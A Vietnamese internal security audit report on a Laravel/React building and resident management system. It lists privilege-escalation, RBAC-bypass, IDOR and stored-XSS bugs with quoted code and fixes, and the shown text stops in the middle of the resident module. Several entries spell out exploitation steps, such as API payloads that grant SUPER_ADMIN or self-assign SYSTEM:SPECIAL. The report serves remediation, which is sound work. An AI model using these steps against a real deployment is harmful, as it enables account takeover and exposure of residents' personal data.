# BUG-04 STAGE 2B – BÁO CÁO KIỂM TOÁN BẢO MẬT & NGHIỆP VỤ TOÀN DIỆN (STRICT READ-ONLY)

**Dự án:** Hệ thống Quản lý Tòa nhà & Cư dân SMART CASSAVAS (`UMISORA09/QUANLY_TOANHA-DANCU`)  
**Nhánh mục tiêu kiểm toán:** `QuocTin/Fix_all` (HEAD `27fca66`, đồng bộ với `origin/QuocTin/Fix_all`)  
**Developer phụ trách:** `QuocTin`  
**Chế độ thực hiện:** `STRICT REVIEW ONLY – READ ONLY – NO SOURCE CODE MODIFICATION`  
**Ngày kiểm toán:** 2026-11-11  

---

## 1. Executive Summary

Quá trình kiểm toán BUG-04 Stage 2B thực hiện rà soát độc lập toàn bộ call chain `Route → Middleware → FormRequest → Controller → Service → Model → MySQL → Realtime/Search → Frontend UI` trên 12 nhóm chức năng (Module 1–11 và Module 12 Kiểm tra hồi quy), đồng thời đối chiếu kết quả chạy thực tế PHPUnit trên MySQL 8 (`quanly_toanha_test` trong WSL) và kiểm tra lịch sử Git.

### Kết luận tổng quan
- **Trạng thái Git & Stage 2A:** Nhánh `QuocTin/Fix_all` đang sạch hoàn toàn (`nothing to commit, working tree clean`), HEAD `27fca66` khớp `origin/QuocTin/Fix_all` và đã được merge vào `origin/master` / `master` (`7b79cba`, PR #200). Bốn controller của thành viên khác từng sửa trong Stage 2A (`InvoiceManagementController`, `InvoiceGenerationController`, `DebtReminderController`, `BuildingStructureController`) đã được revert về `master` tại commit `00aaed8`, giữ nguyên nâng cấp `User.php` (`CUSTOM_USER_%`, `clearPermissionCache()`, siết `SPECIAL`/`SYSTEM:SPECIAL`).
- **Phát hiện lỗ hổng cốt lõi (Root Cause Pattern):** Ngoại trừ Module 1 (`/api/v1/users`, `/api/v1/roles`, `/api/v1/permissions`) có `permission:*` middleware, **hầu hết các module nghiệp vụ còn lại (Module 2, 3, 4, 5, 7, 8/9, 10, 11) đang kiểm tra quyền bằng danh sách role hardcode (`BUILDING_MANAGER`, `RECEPTIONIST`, `SECURITY_GUARD`, ...) hoặc chỉ kiểm tra `USER:CREATE`**, khiến:
  1. **Leo thang đặc quyền lên `SUPER_ADMIN` (`CRITICAL`):** Qua `AccountProvisioningController::store`/`update`/`import` (cho phép `BUILDING_MANAGER` hoặc user có `USER:CREATE` gán role `SUPER_ADMIN`) và `UserController::syncUserPermissions` (cho phép người có `USER:UPDATE` tự cấp `SYSTEM:SPECIAL` / `ROLE:ASSIGN_PERMISSION` cho chính mình qua `CUSTOM_USER_%`).
  2. **Bypass RBAC hoàn toàn hoặc bypass action-level (`HIGH`/`CRITICAL`):** Ở `ServicePricingController::checkAdminAuthorization` (bất kỳ token nào bắt đầu bằng `smart_token_` đều bypass — nằm trong file của `Xuân Hòa`), `VehicleController::checkAdminAuthorization` (mọi action CRUD/Approve/Sync Invoice đều pass tham số permission `null` và cho phép `VEHICLE:VIEW` gọi API ghi), `AccessCardController::checkAuthorization` (chỉ check role), `ReceptionParcelService::assertStaffAuthorized` & `ReceptionVisitorService::assertStaffAuthorized` (return sớm theo role trước khi check permission), `StaffScheduleController` (chỉ check role) và `ResidentController`/`ResidentRequest` (chỉ check role, bỏ qua `RESIDENT:*`).
  3. **IDOR & Rò rỉ dữ liệu liên căn hộ (`CRITICAL`/`HIGH`):** `VehicleController` mở 3 endpoint `/vehicles/meta/*` không gọi `checkAdminAuthorization` làm lộ thông tin toàn bộ cư dân cho user thường; `ResidentVisitorService::createVisitor` có thể gán cư dân không có căn hộ vào căn hộ đầu tiên hoặc giữ nguyên `apartment_id` nạn nhân khi `!$hasAccess`; `QuocTinRealtimeService::filterEventsForResident` bỏ qua lọc căn hộ cho các kênh `vehicles`, `residents`, `temporary-registrations`; `GlobalSearchService::dbSearchResidents` dính lỗi ưu tiên toán tử `OR` trong fallback MySQL.
  4. **Stored XSS & Rò rỉ/Giả mạo dữ liệu (`HIGH`):** `TemporaryRegistrationService::exportPoliceForm` nội suy HTML không escape và Frontend `TemporaryRegistrationManagement.tsx` render bằng `<iframe srcDoc>` không sandbox + `window.open().document.write()`; `TemporaryRegistrationService::update` không loại bỏ `police_reference_code` cho phép cư dân tự điền mã công an; `VehicleRequest` & `VehicleService` cho phép client gửi `monthly_parking_fee` tùy ý; `ReceptionPortalController::overview` không có auth check và trả số liệu giả khi DB trống.
  5. **Hồi quy Frontend (`HIGH`/`MEDIUM`):** `usePermission.ts` khôi phục wildcard `.endsWith(':SPECIAL')`; gần như toàn bộ trang chức năng (Module 2–11) không kiểm tra `can()` trên UI; `AccountProvisioningManagement.tsx` dùng sai mã vai trò `'SECURITY'` (thay vì `'SECURITY_GUARD'`) khiến tạo nhân viên an ninh bị fallback thành cư dân; `ResidentTemporaryRegistrationPanel.tsx` mở link tải CT01 bằng `<a href>` không gửi Bearer token dẫn tới 401 sau hardening `auth.bearer:strict`.

### Thống kê số lượng phát hiện
- **CONFIRMED BUG:** **47 mã lỗi** (được gom thành 41 dòng trong Bảng Tổng Hợp Mục 17):
  - **CRITICAL:** 7 lỗi (6 thuộc QuocTin + 1 trong file của `Xuân Hòa`)
  - **HIGH:** 19 lỗi (17 thuộc QuocTin + 1 file dùng chung + 1 trong file của `Xuân Hòa`)
  - **MEDIUM:** 19 lỗi (17 thuộc QuocTin + 1 file dùng chung + 1 trong file của `Xuân Hòa`)
  - **LOW:** 2 lỗi (thuộc QuocTin)
- **POTENTIAL BUG / DESIGN ISSUE:** 5 vấn đề (3 Potential Bug + 2 Design Issue)
- **ALREADY FIXED / FALSE POSITIVE:** 8 hạng mục ALREADY FIXED (BUG-01..BUG-05 & Stage 2A) + 1 FALSE POSITIVE (KPI Lịch trực pagination)
- **TEST COVERAGE GAP:** 11 nhóm suite cần bổ sung kịch bản kiểm thử bảo mật/RBAC/IDOR/XSS

---

## 2. Git Branch và Working Tree Audit

### 2.1. Trạng thái Git hiện tại (đã xác minh thực tế)
- **Branch hiện tại:** `QuocTin/Fix_all` (đúng branch mục tiêu)
- **HEAD commit:** `27fca66fdc81005529f446f39eb8d05b029bd414` — `fix(ci): resolve all PHPUnit test failures and restore MeilisearchDriver for CI suite`
- **Tracking remote:** `origin/QuocTin/Fix_all` tại `27fca66` (0 commit chưa push, 0 commit chậm hơn `origin/QuocTin/Fix_all`)
- **Nhánh `master` / `origin/master`:** `7b79cba` (`Merge pull request #200 from UMISORA09/QuocTin/Fix_all`), diff giữa `origin/master..HEAD` bằng `0` file.
- **Nhánh backup Stage 2A:** `backup/QuocTin-Fix_all-before-option1` tại `2f72b78` (lưu bản trước khi thực hiện `00aaed8`).
- **Working tree ban đầu:** Sạch (`nothing to commit, working tree clean`), không có thay đổi local chưa commit hay file untracked.
- **Tệp cache sinh ngoài Git trước audit (không theo dõi):** `bootstrap/cache/config.php` (chứa cấu hình `DB_HOST=db` dùng trong Docker) và `bootstrap/cache/routes-v7.php`. Trong suốt quá trình audit, tuyệt đối không chỉnh sửa hay xóa các tệp này.

### 2.2. Phân biệt trạng thái đồng bộ và sở hữu mã nguồn (QuocTin vs Thành viên khác)
Đối chiếu lịch sử commit (`25189bd..HEAD` và `git log --no-merges`):
- **Nhóm file do `QuocTin` phát triển & phụ trách:**
  - Auth/RBAC & Provisioning: `User.php`, `UserController.php`, `RoleController.php`, `PermissionController.php`, `RbacService.php`, `AccountProvisioningController.php`, `AccountProvisioningService.php`, `AccountProvisioningRequest.php`, `RbacManagement.tsx`, `AccountProvisioningManagement.tsx`, `usePermission.ts`
  - Residents & Temporary Registrations: `ResidentController.php`, `ResidentService.php`, `ResidentRequest.php`, `Resident.php`, `TemporaryRegistrationController.php`, `TemporaryRegistrationService.php`, `TemporaryRegistrationRequest.php`, `TemporaryRegistration.php`, `ResidentManagement.tsx`, `TemporaryRegistrationManagement.tsx`, `ResidentTemporaryRegistrationPanel.tsx`
  - Vehicles & RFID: `VehicleController.php`, `VehicleService.php`, `VehicleRequest.php`, `Vehicle.php`, `VehicleManagement.tsx`, `AccessCardController.php`, `AccessCardService.php`, `AccessCardRequest.php`, `AccessCard.php`, `RfidManagement.tsx`
  - Visitors, Parcels & Dashboard: `ResidentVisitorController.php`, `ResidentVisitorService.php`, `ReceptionVisitorController.php`, `ReceptionVisitorService.php`, `ReceptionDashboardController.php`, `ReceptionDashboardService.php`, `ReceptionParcelController.php`, `ReceptionParcelService.php`, `Parcel.php`, `VisitorRegistration.php`, `ResidentVisitorRegistrationPanel.tsx`, `ReceptionVisitorCheckinPanel.tsx`, `ReceptionParcelPanel.tsx`, `ResidentParcelWidget.tsx`, `ReceptionDashboardPanel.tsx`
  - Staff Schedules, Realtime & Global Search: `StaffScheduleController.php`, `StaffScheduleService.php`, `ManagementStaffSchedulePanel.tsx`, `QuocTinRealtimeService.php`, `RealtimeStreamController.php`, `GlobalSearchController.php`, `GlobalSearchService.php`, `GlobalSearchModal.tsx`, `globalSearchApi.ts`, `PushNotificationController.php`
- **Nhóm file thuộc thành viên khác / dùng chung (CHỈ GHI NHẬN & ĐỀ XUẤT, KHÔNG ĐƯỢC SỬA TRỰC TIẾP NẾU KHÔNG ĐƯỢC PHÊ DUYỆT):**
  - `ServicePricingController.php`, `ServicePricingService.php`, `ServicePricingManagement.tsx`, `servicePricingApi.ts` — commit gốc `042774e`, `d433337`, `712ba11` bởi **`Xuân Hòa <vhoa1682006@gmail.com>`** (Module 10 trong prompt).
  - `ReceptionPortalController.php` — khởi tạo bởi **`Xuân Hòa`** (`e2cb8a5`), tối ưu bởi **`Ma`** (`07be2c5`) và **`Quốc Tín`** (`f5d6f02`).
  - `ResidentPortalController.php` — đồng tác giả **`Quốc Tín`** (`f48336e`) và **`Ma`** (`d725f5e`, `e46c1c1`).
  - `AuthenticateBearer.php` & `routes/web.php` — file lõi dùng chung của toàn team.

### 2.3. Kiểm tra bảo toàn các thay đổi BUG-04 Stage 2A

| File Stage 2A | Trạng thái trên `QuocTin/Fix_all` (`27fca66`) | So với `origin/master` (`7b79cba`) | Chi tiết xác minh |
|---|---|---|---|
| `app/Models/User.php` | Đã giữ lại (`PRESERVED`) | Khớp 100% | Giữ nguyên `CUSTOM_USER_%` precedence trong `getAllPermissions()`, `clearPermissionCache()`, và `hasPermission('SPECIAL')` chỉ nhận `'SPECIAL'` hoặc `'SYSTEM:SPECIAL'`. |
| `app/Http/Controllers/InvoiceManagementController.php` | Đã revert về code team (`00aaed8`) | Khớp 100% | Không còn thay đổi Stage 2A của QuocTin trên nhánh chính; bản hardened chỉ nằm ở backup `2f72b78`. |
| `app/Http/Controllers/InvoiceGenerationController.php` | Đã revert về code team (`00aaed8`) | Khớp 100% | Như trên (thuộc module thành viên khác). |
| `app/Http/Controllers/DebtReminderController.php` | Đã revert về code team (`00aaed8`) | Khớp 100% | Như trên (thuộc module thành viên khác). |
| `app/Http/Controllers/BuildingStructureController.php` | Đã revert về code team (`00aaed8`) | Khớp 100% | Như trên (thuộc module thành viên khác). |
| `tests/Feature/Invoices/InvoiceAndBuildingAuthorizationTest.php` | Đã xóa khỏi nhánh (`00aaed8`) | Không tồn tại | Bị xóa khi clean phạm vi module thành viên khác; còn trong backup `2f72b78`. |

---

## 3. Danh sách 12 nhóm chức năng đã kiểm tra

| Nhóm | Phạm vi kiểm tra | Thành phần chính đã audit | Đánh giá tuân thủ RBAC & Bảo mật |
|---|---|---|---|
| **Module 1** | RBAC / Authorization & Account Provisioning | `User.php`, `RbacService`, `CheckPermission`, `AuthenticateBearer`, `UserController`, `RoleController`, `AccountProvisioning*`, `usePermission.ts`, `RbacManagement.tsx` | **KHÔNG ĐẠT** – Có lỗ hổng leo thang lên `SUPER_ADMIN`, hỏng tái gán quyền sau reset, sót `deleted_at` trong role query và regression wildcard `:SPECIAL` ở Frontend. |
| **Module 2** | Quản lý Chủ hộ & Nhân khẩu | `ResidentController`, `ResidentRequest`, `ResidentService`, `Resident.php`, `ResidentManagement.tsx` | **KHÔNG ĐẠT** – Chặn quyền bằng role thay vì permission, hỏng nghiệp vụ thêm lại nhân khẩu từng soft-delete, thiếu validation ngày kết thúc vs DB hiện có. |
| **Module 3** | Tạm trú / Tạm vắng | `TemporaryRegistrationController`, `TemporaryRegistrationRequest`, `TemporaryRegistrationService`, `TemporaryRegistration.php`, `TemporaryRegistrationManagement.tsx`, `ResidentTemporaryRegistrationPanel.tsx` | **KHÔNG ĐẠT** – Stored XSS qua mẫu CT01, cư dân tự ghi `police_reference_code`, CCCD lưu đĩa `public`, check quyền bằng role, link tải CT01 thiếu Bearer token. |
| **Module 4** | Quản lý Phương tiện | `VehicleController`, `VehicleRequest`, `VehicleService`, `Vehicle.php`, `VehicleManagement.tsx` | **KHÔNG ĐẠT** – `VEHICLE:VIEW` gọi được API ghi/duyệt/sync hóa đơn, 3 API `/vehicles/meta/*` lộ toàn bộ PII cư dân không check quyền, client ghi đè được phí giữ xe, thiếu luồng Từ chối. |
| **Module 5** | Quản lý Thẻ RFID | `AccessCardController`, `AccessCardRequest`, `AccessCardService`, `AccessCard.php`, `RfidManagement.tsx` | **KHÔNG ĐẠT** – Chỉ check role, cast UUID thành `(int)` làm hỏng `actor_id` realtime, mở khóa nhầm thẻ `REVOKED`/`LOST_REPORTED`, thiếu cross-check user/vehicle thuộc căn hộ. |
| **Module 6** | Đăng ký Khách (Cư dân) | `ResidentVisitorController`, `ResidentVisitorService`, `VisitorRegistration.php`, `ResidentPortalController`, `ResidentVisitorRegistrationPanel.tsx` | **KHÔNG ĐẠT** – Fallback gán vào căn hộ đầu tiên DB, lỗ hổng IDOR giữ nguyên `apartment_id` nạn nhân khi user chưa có căn hộ, logic `$hasOwn` bất nhất, Portal overview lộ QR/CCCD khách hàng xóm. |
| **Module 7** | Khách Tiếp Tân & Dashboard | `ReceptionVisitorController`, `ReceptionVisitorService`, `ReceptionDashboardController`, `ReceptionDashboardService`, `ReceptionPortalController` | **KHÔNG ĐẠT** – `assertStaffAuthorized` ưu tiên role dẫn tới `VISITOR:VIEW` vẫn check-in được, `ReceptionPortalController::overview` không có auth và trả số liệu demo giả. |
| **Module 8** | Bưu phẩm | `ReceptionParcelController`, `ReceptionParcelService`, `Parcel.php`, `ReceptionParcelPanel.tsx`, `ResidentParcelWidget.tsx`, `ParcelNotificationTest` | **KHÔNG ĐẠT** – `assertStaffAuthorized` bỏ qua check permission thực tế (`PARCEL:*` chưa seed), `getParcels` lộ KPI toàn tòa nhà cho cư dân, không lọc thời hạn lưu trú & chủ sở hữu trong `resolveResidentApartmentIds`. |
| **Module 9** | Bàn giao Bưu phẩm | `ReceptionParcelController::checkOut`, `ReceptionParcelService::handoverParcel`, `ReceptionParcelService::updateParcel` | **CẢNH BÁO** – Concurrency khi checkout tốt (`lockForUpdate`), nhưng phân quyền vẫn theo role (`assertStaffAuthorized`), còn race condition giữa `updateParcel` và `handoverParcel`. |
| **Module 10** | Biểu phí Dịch vụ *(Xuân Hòa)* | `ServicePricingController`, `ServicePricingService`, `ServicePricingManagement.tsx`, `servicePricingApi.ts` | **NGUY HIỂM (File thành viên khác)** – Bypass hoàn toàn `checkAdminAuthorization` cho mọi `smart_token_*`, không auth ở `index()`, sửa biểu phí đang gắn hóa đơn chưa khóa lịch sử. |
| **Module 11** | Lịch trực Nhân viên | `StaffScheduleController`, `StaffScheduleService`, `ManagementStaffSchedulePanel.tsx` | **KHÔNG ĐẠT** – Chỉ check role (chưa dùng permission), thiếu Week View ở UI, thiếu middleware `auth.bearer` & `cooldown:schedules` trên route, `VIEWER` xem được PII ứng viên nhân sự. |
| **Module 12** | Kiểm tra Hồi quy & Shared Search/Realtime | `User.php`, `AuthController`, `AuthenticateBearer`, `QuocTinRealtimeService`, `GlobalSearchService`, `GlobalSearchModal.tsx`, `app.tsx` | **CÓ HỒI QUY / LỖ HỔNG MỚI** – Regression `:SPECIAL` ở `usePermission.ts`, rò rỉ event realtime sang cư dân khác ở `filterEventsForResident`, lỗi SQL OR precedence trong `GlobalSearchService::dbSearchResidents`. |

---

## 4. Danh sách toàn bộ bug xác nhận (`CONFIRMED BUG`)

Chi tiết toàn bộ **47 mã lỗi CONFIRMED BUG** kèm bằng chứng file/dòng, mã nguồn trích dẫn, nguyên nhân, kịch bản khai thác, role/permission khai thác, API bị ảnh hưởng, ảnh hưởng nghiệp vụ, mức độ, hướng sửa tối thiểu và test cần bổ sung được trình bày tổng hợp cùng Mục 7, 8, 9, 10, 11, 12 và Bảng Tổng Hợp cuối báo cáo. Dưới đây phân nhóm cụ thể theo từng Module:

### Nhóm A – Module 1: RBAC / Authorization & Account Provisioning

#### [BUG-M1-01] `CRITICAL` – Leo thang đặc quyền từ `BUILDING_MANAGER` hoặc `USER:CREATE` lên `SUPER_ADMIN` qua Account Provisioning
- **Vị trí:** [AccountProvisioningController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/AccountProvisioningController.php#L39-L41), [AccountProvisioningRequest.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Requests/AccountProvisioningRequest.php#L16-L36), [AccountProvisioningService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/AccountProvisioningService.php#L427-L509)
- **Logic hiện tại:**
  ```php
  // AccountProvisioningController.php:39-41
  $isAdmin = (method_exists($user, 'isSuperAdmin') && $user->isSuperAdmin())
      || (method_exists($user, 'hasRole') && $user->hasRole(['SUPER_ADMIN', 'BUILDING_MANAGER', 'ADMIN']))
      || (method_exists($user, 'hasPermission') && $user->hasPermission('USER:CREATE'));
  ```
  Và trong `AccountProvisioningService::assignRoles()` (L427–458) không hề kiểm tra quyền của `$actor` đối với role `SUPER_ADMIN`/`SUPER_ADMI`/`ADMIN`. Đồng thời mọi endpoint `index`, `store`, `show`, `update`, `destroy`, `toggleLock`, `resendActivation`, `batchResend`, `import` đều dùng chung `checkAdminAuthorization($request)`.
- **Nguyên nhân:** Không tách quyền giữa Xem/Tạo/Sửa/Xóa/Gán Role, và bỏ qua ràng buộc chỉ `SUPER_ADMIN` mới được gán role `SUPER_ADMIN` như bên `RbacService::syncUserRoles()`.
- **Kịch bản khai thác:** User A chỉ có quyền `USER:CREATE` (hoặc role `BUILDING_MANAGER`) gửi `POST /api/v1/account-provisioning` (hoặc `PUT /api/v1/account-provisioning/{otherId}` hoặc `POST /api/v1/account-provisioning/import`) kèm `"roles": ["SUPER_ADMIN"]` tới email kiểm soát bởi kẻ tấn công -> kích hoạt tài khoản -> nhận toàn quyền `SUPER_ADMIN`. User có `USER:CREATE` còn có thể gọi `PUT/DELETE/toggle-lock` trên cả tài khoản `SUPER_ADMIN`.
- **Ảnh hưởng module khác:** Phá vỡ hoàn toàn biên giới RBAC toàn hệ thống (CICD, Tài chính, Cài đặt).
- **Đề xuất sửa:** Chặn `SUPER_ADMIN`/`SUPER_ADMI`/`ADMIN` trong `AccountProvisioningService::assignRoles()` nếu `! $actor?->isSuperAdmin()`; phân tách tham số permission cho từng method trong `AccountProvisioningController` (`USER:VIEW`, `USER:CREATE`, `USER:UPDATE`, `USER:DELETE`); trong `updateAccount()` / `deleteAccount()` / `toggleLockAccount()` cấm tự khóa/xóa chính mình và cấm non-`SUPER_ADMIN` sửa/xóa/khóa user `SUPER_ADMIN`, gọi `$user->clearPermissionCache()` sau khi đổi role.

#### [BUG-M1-02] `CRITICAL` – Tự nâng quyền bằng Custom User Permissions (`PUT /api/v1/users/{id}/permissions`)
- **Vị trí:** [routes/web.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/routes/web.php#L472-L474), [UserController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/UserController.php#L339-L393)
- **Logic hiện tại:**
  ```php
  Route::put('users/{id}/permissions', [UserController::class, 'syncUserPermissions'])
      ->middleware('permission:USER:UPDATE|ROLE:ASSIGN_PERMISSION');
  ```
  Trong `UserController::syncUserPermissions()` không kiểm tra xem `$actor` có `ROLE:ASSIGN_PERMISSION` không, không kiểm tra `$actor->id === $user->id` (tự nâng quyền chính mình), và không giới hạn tập quyền có thể cấp (như `SYSTEM:SPECIAL`, `ROLE:*`, `CICD:DEPLOY`).
- **Kịch bản khai thác:** Nhân viên được cấp `USER:UPDATE` gọi `PUT /api/v1/users/{self_id}/permissions` với payload `{"permissions": ["SYSTEM:SPECIAL", "ROLE:ASSIGN_PERMISSION", "USER:DELETE", "CICD:DEPLOY"]}`. Ngay request kế tiếp, nhân viên này mang role `CUSTOM_USER_...` có mọi quyền nhạy cảm.
- **Đề xuất sửa:** Đổi middleware chỉ còn `permission:ROLE:ASSIGN_PERMISSION` (bỏ `USER:UPDATE`), cấm non-`SUPER_ADMIN` cấp quyền vượt quá tập quyền mình sở hữu hoặc cấp `SYSTEM:SPECIAL`/`SUPER_ADMIN` permissions, cấm sửa `SUPER_ADMIN` user hoặc tự nâng quyền chính mình.

#### [BUG-M1-03] `HIGH` – Crash `500 Duplicate Entry` khi phân quyền riêng lại cho user sau khi đã Reset quyền
- **Vị trí:** [UserController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/UserController.php#L353-L360), [UserController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/UserController.php#L404-L415), [Role.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Models/Role.php#L13)
- **Logic hiện tại:** `resetUserPermissions()` gọi `$role->delete()` (soft-delete vì `Role` dùng `SoftDeletes`), nhưng bảng `roles` trong MySQL có `UNIQUE KEY role_code (role_code)` trên tất cả các dòng kể cả đã xóa mềm. Lần kế tiếp `syncUserPermissions()` gọi `Role::firstOrCreate(['role_code' => $customRoleCode], ...)` không tìm thấy bản ghi active nên thực hiện `INSERT` trùng `role_code` -> MySQL lỗi `1062 Duplicate entry`.
- **Đề xuất sửa:** Dùng `Role::withTrashed()->firstOrNew(['role_code' => $customRoleCode])`, nếu `$role->trashed()` thì `$role->restore()` trước khi `save()`.

#### [BUG-M1-04] `HIGH` – Hồi quy wildcard `:SPECIAL` trong Frontend Hook `usePermission.ts`
- **Vị trí:** [usePermission.ts](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/Hooks/usePermission.ts#L71-L79), [usePermission.ts](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/Hooks/usePermission.ts#L127-L134)
- **Logic hiện tại:**
  ```ts
  if (cleanPerm === 'SPECIAL') {
    return (
      permissions.includes('SPECIAL') ||
      permissions.includes('SYSTEM:SPECIAL') ||
      permissions.includes('USER:SPECIAL') ||
      permissions.some((p) => p.endsWith(':SPECIAL'))
    );
  }
  ```
- **Nguyên nhân:** Stage 2A đã vá backend `User::hasPermission('SPECIAL')` để không còn nhận `MODULE_A:SPECIAL` hay `USER:SPECIAL`, nhưng Frontend vẫn giữ logic cũ khiến UI nhận nhầm quyền đặc biệt module bất kỳ là quyền `SPECIAL` cấp hệ thống.
- **Đề xuất sửa:** Rút gọn chỉ kiểm tra `permissions.includes('SPECIAL') || permissions.includes('SYSTEM:SPECIAL')` ở cả hai hàm `can()`.

#### [BUG-M1-05] `MEDIUM` – `User::getAllPermissions()` & `RbacService::hasPermission()` không lọc `roles.deleted_at IS NULL`
- **Vị trí:** [User.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Models/User.php#L165-L172), [RbacService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/RbacService.php#L45-L61)
- **Nguyên nhân:** Nhánh non-custom trong `User::getAllPermissions()` join thẳng `role_permissions` và `user_roles` không join bảng `roles` để kiểm tra `whereNull('roles.deleted_at')`. Tương tự `RbacService::hasPermission()` nhánh fallback `$user` là `stdClass` cũng bỏ qua `roles.deleted_at IS NULL`, bỏ qua `CUSTOM_USER_%` override và bỏ qua alias `SYSTEM:SPECIAL`.
- **Đề xuất sửa:** Join `roles` và thêm `->whereNull('roles.deleted_at')` ở cả hai nơi; đồng bộ lookup quyền ở `RbacService::hasPermission()` khi user không phải Eloquent model.

#### [BUG-M1-06] `MEDIUM` – Kích hoạt tài khoản chấp nhận so khớp trực tiếp raw bcrypt hash (`hash_equals`) và Public API lộ `username` + `full_name`
- **Vị trí:** [AccountProvisioningService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/AccountProvisioningService.php#L319), [AccountProvisioningController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/AccountProvisioningController.php#L225-L268), [routes/web.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/routes/web.php#L596)
- **Logic hiện tại:** `Hash::check($token, $record->token) || hash_equals($record->token, $token)` (L319) cho phép dùng chính chuỗi bcrypt hash làm token kích hoạt nếu lộ bản đọc `password_reset_tokens`. Đồng thời `GET /api/v1/account-provisioning/status?email=...` không có xác thực, không cần token kích hoạt và không gắn `throttle`, trả trực tiếp `username`, `full_name`, `email`, `is_activated` cho phép dò thông tin nhân sự/cư dân.
- **Đề xuất sửa:** Chỉ dùng `Hash::check($token, $record->token)` (hoặc hash `sha256` token trước khi lưu); gắn `throttle:20,1` và ẩn bớt `username`/`full_name` hoặc yêu cầu tham số `token` hợp lệ ở `/account-provisioning/status`.

#### [BUG-M1-07] `HIGH` – `AccountProvisioningManagement.tsx` gửi sai mã vai trò `'SECURITY'` thay cho `'SECURITY_GUARD'`
- **Vị trí:** [AccountProvisioningManagement.tsx](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/Pages/Admin/AccountProvisioningManagement.tsx#L841), [AccountProvisioningManagement.tsx](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/Pages/Admin/AccountProvisioningManagement.tsx#L1303), [AccountProvisioningService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/AccountProvisioningService.php#L429-L438)
- **Nguyên nhân:** Cả modal tạo và modal sửa tài khoản chọn `{ value: 'SECURITY', label: 'Nhân Viên An Ninh' }`, nhưng database (`RbacSeeder`) chỉ seed `SECURITY_GUARD`. Kết quả `Role::whereIn('role_code', ['SECURITY'])` rỗng -> `assignRoles()` tự động fallback gán nhầm thành `RESIDENT_OWNER`!
- **Đề xuất sửa:** Đổi value thành `'SECURITY_GUARD'` ở cả 2 modal và thay fallback âm thầm sang `RESIDENT_OWNER` bằng ném lỗi validation khi `role_code` không hợp lệ.

#### [BUG-M1-08] `MEDIUM` – AppSidebar chỉ kiểm tra quyền cho 5/15 mục menu và `app.tsx` thiếu chặn cư dân ở `/le-tan`
- **Vị trí:** [AppSidebar.tsx](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/Components/Layout/AppSidebar.tsx#L62-L79), [AppTopbar.tsx](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/Components/Layout/AppTopbar.tsx#L64-L85), [app.tsx](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/app.tsx#L438-L553)
- **Nguyên nhân:** `AppSidebar.tsx` chỉ check `can()` với `roles`, `amenities`, `billing`, `tickets`, `reports`; toàn bộ các mục của QuocTin (`residents`, `account_provisioning`, `temporary_registrations`, `schedules`, `parking`, `vehicle_reg`, `parcels`, `keys`, `visitors`, `pricing_configs`) đều `return true;`. Ở `app.tsx:546-553`, nhánh `isReceptionistPath` không chặn user mang role `resident` truy cập `/le-tan` hoặc `/an-ninh`; còn `isManagerPath` L482 hardcode `userRole="manager"`. `AppTopbar.tsx:64-84` tin `sessionUser?.role === 'admin'` từ `localStorage` để bật `canSwitchPortal`.

---

### Nhóm B – Module 2: Quản lý Chủ hộ & Nhân khẩu Căn hộ

#### [BUG-M2-01] `HIGH` – Chặn quyền bằng Role thay cho RBAC Permission ở `ResidentController` & `ResidentRequest`
- **Vị trí:** [ResidentController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/ResidentController.php#L35-L36), [ResidentRequest.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Requests/ResidentRequest.php#L22-L28)
- **Nguyên nhân:** Chỉ check `isSuperAdmin() || hasRole(['SUPER_ADMIN', 'BUILDING_MANAGER'])`, không check `RESIDENT:VIEW`, `RESIDENT:CREATE`, `RESIDENT:UPDATE`, `RESIDENT:DELETE`, và bảng `permissions` được seed bởi `RbacSeeder` cũng thiếu `RESIDENT:CREATE/UPDATE/DELETE` (chỉ có `RESIDENT:VIEW`). Người dùng được cấp quyền `RESIDENT:VIEW` qua ma trận RBAC vẫn bị chặn 403, ngược lại `BUILDING_MANAGER` bị thu hồi quyền trên UI RBAC vẫn thao tác CRUD được.
- **Đề xuất sửa:** Bổ sung seed `RESIDENT:CREATE/UPDATE/DELETE` vào `RbacSeeder`, truyền đúng permission vào từng method của `ResidentController` và `ResidentRequest::authorize()` theo HTTP verb (`GET` -> `RESIDENT:VIEW`, `POST` -> `RESIDENT:CREATE`, `PUT/PATCH` -> `RESIDENT:UPDATE`, `DELETE` -> `RESIDENT:DELETE`).

#### [BUG-M2-02] `HIGH` – Không thể khôi phục hoặc thêm lại nhân khẩu đã từng Soft-Delete (`409` / Crash)
- **Vị trí:** [ResidentService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/ResidentService.php#L162-L220)
